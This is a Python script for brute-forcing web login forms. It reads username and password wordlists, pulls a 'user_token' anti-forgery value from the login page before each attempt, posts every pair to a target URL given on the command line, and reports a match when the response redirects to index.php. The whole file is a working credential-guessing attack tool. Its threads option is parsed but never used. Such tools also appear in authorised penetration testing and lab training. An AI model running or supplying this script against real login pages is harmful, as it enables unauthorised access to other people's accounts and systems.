import requests
import os
import argparse
from html.parser import HTMLParser

def argument_parse():
    pars = argparse.ArgumentParser(
            prog='Python Login Brute-Force',
            description='A small tool for brute-forcing a Login',
            usage='bruteforce_login.py -u [username file or single username] -p [password file] -t [target URL] --threads [number of threads (default 4)] -v [verbose mode(show each attempt)]',
            epilog='bruteforce_login.py -u username.txt -p passwords.txt -t example.domain.com --threads 5 -v'
            )

    pars.add_argument(
            "-u", "--username",
            required=True,
            help="Path to the username file"
            )

    pars.add_argument(
            "-p", "--password",
            required=True,
            help="Path to the password file"
            )

    pars.add_argument(
            "-t", "--target",
            required=True,
            help="URL of the target"
            )
    
    pars.add_argument(
            "--threads",
            type=int,
            default=4,
            help="The Number of Threads"
            )

    pars.add_argument(
            "-v", "--verbose",
            action="store_true",
            help="Verbose output"
            )
    return pars.parse_args()

class TokenParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.token = None

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "input" and attrs.get("name") == "user_token":
            self.token = attrs.get("value")

def get_token(session, url):
    response = session.get(url)
    parser = TokenParser()
    parser.feed(response.text)
    return parser.token

def payload(url, username,password,token, session):
    data = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": token
        }
    response = session.post(url, data=data)
    return response


def brute_force(username_file, password_file, url, verbose):
    success = False
    try:
        with open(username_file, "r") as username:
            session = requests.Session()

            for username_in_line in username:
                with open(password_file, "r") as password:
                    for password_in_line in password:
                        
                        token = get_token(session, url)
                        result = payload(url, username_in_line.strip(), password_in_line.strip(), token, session)
                        if "index.php" in result.url:
                            success = True
                            print(f" Found correct credentials {username_in_line} and {password_in_line}")
                            break
                        else:
                            if verbose:
                                print("Credentials still yet not found proceed with next")


    except Exception as e:
        print(f"Script met an error: {e}") 
    
    if success == False:
        print("No credentials were matched")


if __name__ == "__main__":
    args = argument_parse()
    brute_force(args.username, args.password, args.target, args.verbose)
